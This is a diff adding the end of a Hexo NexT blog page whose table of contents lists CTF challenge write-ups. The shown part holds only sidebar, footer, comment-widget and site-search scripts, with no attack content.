+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+          
+          
+
+          
+          
+
+          
+          
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ezphp"><span class="nav-text">ezphp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezcmd"><span class="nav-text">ezcmd</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ezinclude"><span class="nav-text">ezinclude</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blockchain"><span class="nav-text">Blockchain</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#智能合约-那是啥"><span class="nav-text">智能合约? 那是啥</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#佛系青年BingGe"><span class="nav-text">佛系青年BingGe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Bivibivi"><span class="nav-text">Bivibivi</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">
+  	w1ndy
+  </span>
+  
+</div>
+<!--
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+-->
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* 
+		Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数
+        */
+		var t1 = Date.UTC(2019,11,26,00,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}
+	siteTime();
+</script>
+
+<div>
+	<a class="beian" target="_blank" href="https://beian.miit.gov.cn/" style="color:#555;text-decoration:none;padding-left:30px;background:url(https://s1.ax1x.com/2018/09/29/ilmwIH.png) no-repeat left center" rel="nofollow">陕ICP备********号</a>
+</div>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '4E8wQUkAe7L6JRV6F3qUD9v7-MdYXbMMI# your leancloud application appid',
+        appKey: 'wt7SKkgYglRxxeJSr1fJvq7C# your leancloud application appkey',
+        placeholder: '欢迎留言',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'5' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/fireworks.js"></script>
+</body>
+</html>
